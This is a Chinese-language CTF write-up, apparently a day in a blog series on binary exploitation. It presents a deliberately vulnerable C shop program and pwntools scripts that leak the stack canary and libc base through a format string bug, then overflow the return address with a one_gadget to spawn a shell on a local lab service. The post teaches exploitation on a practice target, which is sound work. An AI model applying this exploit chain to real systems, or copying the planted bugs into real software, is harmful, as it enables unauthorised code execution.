---
title: "Day20－Stack 題目練習"
date: 2024-09-20
draft: false
tags: ["iron-man-2024", "pwn", "binary-exploitation"]
categories: ["security-research"]
author: "YJK"
showToc: true
TocOpen: false
---


## [Lab 網址](https://github.com/YJK0805/PWN-CTF-note/)

## 前言

今天大致來到 Stack 部分的尾聲，前面的內容我們討論了幾個經典的 Stack 漏洞，講解了如何進行攻擊並編寫 exploit，也介紹了不少實用的工具。今天，我們將實際練習一道程式碼量較大的題目，這是我在 HITCON 社團攤位時設計的練習題目。

## Lab

查看以下原始碼：

```c=
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>
int choice,num;
char *product[3] = {
    "shirt\n",
    "sticker\n",
    "tissue\n"
};

void buy(){
    printf("We have 3 products:\n");
    for(int i=0; i<3; i++){
        printf("%d. %s", i+1, product[i]);
    }
    printf("Which one do you want to buy? ");
    scanf("%d", &choice);
    printf("You have bought %s\n", product[choice-1]);
    printf("How many do you want to buy? ");
    scanf("%d", &num);
    return;
}

char address[0x20];
int main(){
    setvbuf(stdout, 0, _IONBF, 0);
    setvbuf(stdin, 0, _IONBF, 0);
    printf("This is HackerSir!\n");
    printf("Welcome to the shop!\n");
    printf("1. Buy\n");
    printf("2. Exit\n");
    printf("Your choice: ");
    scanf("%d", &choice);
    if(choice==1){
        buy();
        printf("Please leave your address: ");
        scanf("%s", address);
        printf(address);
    }else{
        printf("Goodbye!\n");
        exit(0);
    }
    char last[0x10];
    printf("\nleave your last message to our club: ");
    read(0, last, 0x30);
    return 0;
}
```

使用以下指令進行編譯：

```bash=
gcc src/online_shopping.c -o ./online_shopping/share/online_shopping -fstack-protector-all -z now
```

## writeup

從編譯參數可以看出，程式是動態連結且保護全開。如果想要透過 return address 控制程式流程，需要先 leak 出 canary。我們注意到第 18 行有機會透過越界存取資訊，第 38 行可以利用 format string bug 來 leak 出 stack 資訊，最後的 read 也可能導致 overflow。因此，我們需要確認以下幾點：

- 能否找到 libc base 和 canary
- 有多少 overflow 空間，以及能否透過某種方法獲取 shell

首先確認能否找到 libc base 和 canary。這裡使用簡單的 script 來驗證是否可以利用 format string 漏洞 leak 出這些資訊。在此之前，我們可以換用適當的 libc，參考[Day13－How to change libc & ret2libc](https://ithelp.ithome.com.tw/articles/10359126)

利用 format string 漏洞，先用 %p 格式輸出 stack 的值，通過 gdb 檢查是否能獲取有用的資訊。後面的 `-` 用來分隔每個位置，方便後續寫 exploit 時精確控制。

以下是簡單的 script：

```py=
from pwn import *
r = process('./online_shopping')
context.terminal = ['tmux', 'splitw', '-h']
gdb.attach(r)
r.sendlineafter('e: ', '1')
r.sendlineafter('buy? ', '1')
r.sendlineafter('buy? ', '1')
r.sendlineafter('ss: ', '%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p')
leak = r.recvuntil('\n', drop=True)
print(leak)
r.interactive()
```

執行後，可以看到第三個參數 offset 是 0x21aaa0，第九個參數是 canary。將 leak 的 payload 改為 `%3$p-%9$p` 以 leak 出 libc base 和 canary，並計算出 libc base。

![image](https://hackmd.io/_uploads/S1hVOV3CC.png)

![image](https://hackmd.io/_uploads/BJeBuV2RR.png)

![image](https://hackmd.io/_uploads/ByvP_E20C.png)

以下是驗證的 script：

```py=
from pwn import *
import sys
r = process('./online_shopping')
# r = remote('127.0.0.1', 10011)
context.terminal = ['tmux', 'splitw', '-h']
gdb.attach(r)
r.sendlineafter('e: ', '1')
r.sendlineafter('buy? ', '1')
r.sendlineafter('buy? ', '1')
r.sendlineafter('ss: ', '%3$p-%9$p')
cnt = r.recvuntil('\n', drop=True)
cnt = cnt.split(b'-')
libc = int(cnt[0], 16) - 0x21aaa0
log.success('libc = ' + hex(libc))
canary = int(cnt[1], 16)
log.success('canary = ' + hex(canary))
r.interactive()
```

確認成功 leak 到 libc 和 canary。

![image](https://hackmd.io/_uploads/rylNYNnAR.png)

接下來，我們嘗試控制程式流程。根據 objdump，我們知道從 rbp-0x20 開始輸入 0x30，因此只可以控制到 return address。由於我們已經 leak 出 libc base，接下來使用 one_gadgets 獲取 shell，具體可參考 [Day14－Other ret2libc(one gadgets)](https://ithelp.ithome.com.tw/articles/10359719)

![image](https://hackmd.io/_uploads/ByK5YV3A0.png)

完整 exploit：

要記得我們在 rbp 前要填入我們所 leak 到的 canary，不然程式會 crash，另外，可以將 rbp 填入 libc 的 bss 段，因為我們沒有事先 leak pie

```py=
from pwn import *
import sys
# r = process('../online_shopping/share/online_shopping')
r = remote('127.0.0.1', 10011)
r.sendlineafter('e: ', '1')
r.sendlineafter('buy? ', '1')
r.sendlineafter('buy? ', '1')
r.sendlineafter('ss: ', '%3$p-%9$p')
cnt = r.recvuntil('\n', drop=True)
cnt = cnt.split(b'-')
libc = int(cnt[0], 16) - 0x21aaa0
log.success('libc = ' + hex(libc))
canary = int(cnt[1], 16)
log.success('canary = ' + hex(canary))
og = libc + 0xebd3f
payload2 = b'A' * 0x18 + p64(canary) + p64(libc + 0x21be00) + p64(og)
r.sendlineafter('club: ', payload2)
r.interactive()
```

solved!!!

![image](https://hackmd.io/_uploads/Hyr5qEh0R.png)
